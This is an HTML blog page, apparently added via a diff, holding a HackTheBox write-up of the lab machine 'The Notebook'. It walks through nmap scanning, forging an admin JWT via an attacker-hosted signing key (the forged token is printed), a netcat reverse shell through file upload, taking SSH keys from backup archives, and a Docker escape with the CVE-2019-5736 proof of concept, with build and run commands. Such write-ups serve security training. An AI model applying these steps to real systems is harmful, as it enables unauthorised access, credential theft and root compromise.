@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+   <meta name="description" content="Welcome back to our usual HackTheBox journey, for today medium rated target - The Notebook. In this blog post, we&rsquo;ve managed to alter client-side JWT cookie, spawn our reverse shell then proceeded to achieve user&rsquo;s SSH credentials and, subsequently, be able to privesc via a docker PoC.
+Enumeration The very initial step is to do a network scan using everyone&rsquo;s favorite utility - nmap.
+┌──(kali㉿kali)-[~/HackTheBox/Boxes/TheNotebook] └─$ sudo nmap -sV -sC -sS 10.">  
+
+  <title>
+    
+      HackTheBox: The Notebook
+    
+  </title>
+
+  
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon/green.png" />
+
+  
+  
+  
+  <link rel="stylesheet" href="//localhost:1313/css/main.f3fa33b7405523e26c3513ae28d727c60efcaaa6c532b418812d08f71cb380419ee24a4e53a155d97b0879f61144b0476768c589c47485ffa080cbc5a4cd85f2.css" integrity="sha512-8/ozt0BVI&#43;JsNROuKNcnxg78qqbFMrQYgS0I9xyzgEGe4kpOU6FV2XsIefYRRLBHZ2jFicR0hf&#43;ggMvFpM2F8g==" />
+  
+
+  
+  <script defer type="text/javascript" src="//localhost:1313/js/jquery_3.7.1.min.js"></script>
+  
+  
+  
+  <script defer type="text/javascript" src="//localhost:1313/js/typing_effect.min.js"></script>
+
+  
+  
+  <script defer type="text/javascript" src="//localhost:1313/js/img_relocs.min.js"></script>
+</head>
+<body a="dark">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a style="color: #ff5;" href="/">[HOME]</a>
+
+<article>
+    <p class="post-meta">
+        
+        <time datetime="2021-06-10 09:30:00 &#43;1345 &#43;1345">
+            2021-06-10
+        </time>
+    </p>
+
+    <h1>HackTheBox: The Notebook</h1>
+
+    
+        <aside >
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#jwt-misconfiguration">JWT misconfiguration</a></li>
+        <li><a href="#the-legendary-called-backups">The legendary called &lsquo;backups&rsquo;</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#footnotes">Footnotes</a></li>
+  </ul>
+</nav>
+        </aside>
+    
+
+    <p>Welcome back to our usual HackTheBox journey, for today medium rated target - The Notebook. In this blog post, we&rsquo;ve managed to alter client-side JWT cookie, spawn our reverse shell then proceeded to achieve user&rsquo;s SSH credentials and, subsequently, be able to privesc via a docker PoC.</p>
+<h2 id="enumeration"><a class="h-anchor" href="#enumeration">Enumeration</a></h2>
+<p>The very initial step is to do a network scan using everyone&rsquo;s favorite utility - <em>nmap</em>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──(kali㉿kali)-[~/HackTheBox/Boxes/TheNotebook]
+</span></span><span style="display:flex;"><span>└─$ sudo nmap -sV -sC -sS 10.10.10.230 -p- -oA nmap/thenotebook
+</span></span><span style="display:flex;"><span>Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-05 05:07 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#f00">for</span> 10.10.10.230
+</span></span><span style="display:flex;"><span>Host is up (0.034s latency).
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#f60">2048</span> 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
+</span></span><span style="display:flex;"><span>|   <span style="color:#f60">256</span> e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
+</span></span><span style="display:flex;"><span>|_  <span style="color:#f60">256</span> c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.14.0 (Ubuntu)
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.14.0 (Ubuntu)
+</span></span><span style="display:flex;"><span>|_http-title: The Notebook - Your Note Keeper
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#f00">done</span>: <span style="color:#f60">1</span> IP address (<span style="color:#f60">1</span> host up) scanned in 21.04 seconds
+</span></span></code></pre></div><p>Nothing much to look at besides their Nginx server running on port <code>80</code>, let&rsquo;s display it in our browser.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-6-5-HTB-thenotebook/2021-06-05_16-13.png"></p>
+<p>The webpage allows us to register an account and have some notes written.</p>
+<h2 id="exploitation"><a class="h-anchor" href="#exploitation">Exploitation</a></h2>
+<h3 id="jwt-misconfiguration"><a class="h-anchor" href="#jwt-misconfiguration">JWT misconfiguration</a></h3>
+<p>At first I thought it was either RFI/LFI or XSS yet I couldn&rsquo;t find any JavaScript objects to exploit. Later that I noticed there was a JWT<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> cookie encoded with our basic login information and we want to change the justice flag <code>admin_cap</code> to <code>True</code> in order to have a more privileged access.</p>
+<p><img alt="jwt.io" src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-6-5-HTB-thenotebook/2021-06-05_16-19.png"></p>
+<p>The token is to be signed and verified with a RSA-256 private key stored on the server local host; therefore we somehow need to find or crack their secret signature though it might take thousands of years to decipher. Luckily, it is not necessary to do any of that since we can trick the server into signing tokens using our own private key. This is feasible due to the server failed to check for the integrity of its token issuers/authorities.</p>
+<p>Now, we need to create a new empty passphrase RSA256 private key (<code>privKey.key</code>) then start a HTTP server on port <code>7070</code> to host it.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-6-5-HTB-thenotebook/2021-06-05_16-37.png"></p>
+<p>Change <code>kid</code> and <code>admin_cap</code> parameter correspondingly to our private key and <code>True</code>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-6-5-HTB-thenotebook/2021-06-05_16-41.png"></p>
+<p>Here is our JWT cookie:</p>
+<pre tabindex="0"><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xMDo3MDcwL3ByaXZLZXkua2V5In0.eyJ1c2VybmFtZSI6ImxlZ2lhaHV5eSIsImVtYWlsIjoibGVnaWFodXl5QGVtYWlsLmNvbSIsImFkbWluX2NhcCI6dHJ1ZX0.EUtQ8LSlpMzKseLGJLVZhKrQoJSbD_BHYhAxuLjvZrKIBGjrzVqxjFnq2OuaBXCkkScsaPvKOBnp_f9LZ5hiRKOPP_N_5E5w2cv1FX_elhEjQe0Y7UWr9BdzWexzzObsaaM_wuF9PR3ydyAc86eg2iI6RXNuWPdv2PYrSsNYWgcF7_Y8QhSMX9nU4UjAQyutziAz-K-Q7eVhQvPubyDYB3cOIl_4Vzw5Jap4W0RvjzrPEQhELHiIO2tcwjqk9_6tZZdaLXYVmn616Ln2WFMXrW1-LaeAPfb5jHBJ1O9r4V35M3tIt7txlimqi116MBmXy4UZUMq0Z0XxLxtO9M070EuzvZwNJea-zZpOBRDMjzxmdDDG-2rOUXuUZDfX2cEGaOgXaudgCAEQZyXTQPGAbND5kf5DMuIKiWTXjokwYeqyOFXLNNmFFYWT1MY-ajEUOorG4WMhVDAZFBzGtJ_Wz75UxOeUl-jYqGyHL99BEwK_ysZtIeLnMoQ1DQcz9CRdcwZymZACk049RAp__SDzzM25tc8TlNzkyuUM0jV6xYTEJ1RqLJ_S0B2TgOLJ6kBYUjy7NdAj9d222mYkDCdxX9HM1rSJ5OdPPE11VqQFwdc-8kgsxjKvIQfXrkHyOHo8kQ8FwweGJR649ebIPsLJ__vmhJB8dNejsKaB4lRuaK0
+</code></pre><p>Pass the poisoned cookie to Burp then forward it will let us access to Admin Panel and other notes on the server.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-6-5-HTB-thenotebook/2021-06-05_16-42.png"></p>
+<p>Most of the notes were gibberish and payloads from our XSS stage, although some of them mentioned about PHP files being executed unrestrictedly and a user named <code>noah</code> kept talking about backups.</p>
+<p>The Admin Panel allows us to upload anything we want; however, the upload folder (<code>/var/www/html</code>), and all the contents or objects therein, will be deleted and cleanup after approximately every 5 minutes. Because of that reason, we cannot use our elegant web-based p0wny<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> shell for long and have to use the legacy netcat connection.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-6-5-HTB-thenotebook/2021-06-05_16-48.png"></p>
+<h3 id="the-legendary-called-backups"><a class="h-anchor" href="#the-legendary-called-backups">The legendary called &lsquo;backups&rsquo;</a></h3>
+<p>Running <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPEAS</a>  as <code>www-data</code> also provides us with the location of the aforementioned backups.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-6-5-HTB-thenotebook/2021-06-05_17-15.png"></p>
+<p>Notable ones are <code>home.tar.gz</code>, <code>passwd.bak</code> and <code>shadow.bak</code> yet I find the latter two only contain some unusable hashes. Extracting the <code>home.tar.gz</code> archive is far more interesting as it has <code>noah</code>&rsquo;s SSH credentials.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#0f0"># Tar extraction command</span>
+</span></span><span style="display:flex;"><span>$ tar xzvf ./var/backups/home.tar.gz -C ./tmp/key
+</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-6-5-HTB-thenotebook/2021-06-05_21-59.png"></p>
+<p>Download and use <code>id_rsa</code> from <code>noah</code>&rsquo;s backups will let us ssh into the server and read his user flag.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-6-5-HTB-thenotebook/2021-06-05_22-04.png"></p>
+<h2 id="privilege-escalation"><a class="h-anchor" href="#privilege-escalation">Privilege Escalation</a></h2>
+<p>Let have a glance at what <code>noah</code> can do.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-6-5-HTB-thenotebook/2021-06-05_22-07.png"></p>
+<p>We can execute <code>/usr/bin/docker exec -it webapp-dev01*</code> as superuser. You can see that I also ran a <code>sudo --version</code> since it is a practical point to check <code>sudo</code> version for low hanging fruit even in these medium boxes just to be certain.</p>
+<p>And while doing a Google search about docker, we came across CVE-2019-5736, which related to this box situation.</p>
+<p>Here is a brief information about the vulnerability.</p>
+<blockquote>
+<p>runc through 1.0-rc6, as used in Docker before 18.09.2 and other products, allows attackers to overwrite the host runc binary (and consequently obtain host root access) by leveraging the ability to execute a command as root within one of these types of containers: (1) a new container with an attacker-controlled image, or (2) an existing container, to which the attacker previously had write access, that can be attached with docker exec. This occurs because of file-descriptor mishandling, related to /proc/self/exe.</p>
+<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5736">Read more</a></p>
+</blockquote>
+<p>Fortunately, we have the PoC of this vulnerability available on GitHub as well.</p>
+<p><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
+<p><img src="https://raw.githubusercontent.com/Frichetten/CVE-2019-5736-PoC/master/screenshots/example1.gif"></p>
+<p>Since today post is not about programming, we will not have any in-depth discussion of how these golang lines are functioning. Basically, the PoC instance running in previously mentioned vulnerable docker then escapes and enables us to execute anything as a root user.</p>
+<p>So then we just need to clone the repository and edit <code>main.go</code>&rsquo;s payload to create a privileged shell back to our host machine.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-6-5-HTB-thenotebook/2021-06-05_22-17.png"></p>
+<p>In case you haven&rsquo;t install golang, run the following lines:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#0f0"># First, install the package</span>
+</span></span><span style="display:flex;"><span>$ sudo apt install -y golang
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Then add the following to your .bashrc</span>
+</span></span><span style="display:flex;"><span>export <span style="color:#eedd82">GOROOT</span>=/usr/lib/go
+</span></span><span style="display:flex;"><span>export <span style="color:#eedd82">GOPATH</span>=<span style="color:#eedd82">$HOME</span>/go
+</span></span><span style="display:flex;"><span>export <span style="color:#eedd82">PATH</span>=<span style="color:#eedd82">$GOPATH</span>/bin:<span style="color:#eedd82">$GOROOT</span>/bin:<span style="color:#eedd82">$PATH</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Reload your .bashrc</span>
+</span></span><span style="display:flex;"><span>$ source .bashrc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Build our crafted PoC</span>
+</span></span><span style="display:flex;"><span>$ go build main.go
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># output saved as $(pwd)/main</span>
+</span></span></code></pre></div><p>then send our exploit to the target machine and execute these command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#0f0"># Open a docker environment</span>
+</span></span><span style="display:flex;"><span>$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Run the PoC in docker</span>
+</span></span><span style="display:flex;"><span>$ chmod +x ./main &amp;&amp; ./main
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Outside docker - noah session</span>
+</span></span><span style="display:flex;"><span>$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
+</span></span></code></pre></div><p>and finally we achieve our <code>root.txt</code>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-6-5-HTB-thenotebook/2021-06-05_22-52.png"></p>
+<h2 id="footnotes"><a class="h-anchor" href="#footnotes">Footnotes</a></h2>
+<div class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1">
+<p><a href="https://jwt.io/introduction">https://jwt.io/introduction</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:2">
+<p><a href="https://github.com/flozz/p0wny-shell/blob/master/shell.php">https://github.com/flozz/p0wny-shell/blob/master/shell.php</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</div>
+
+</article>
+
+            </div>
+        </main>
+    </body></html>
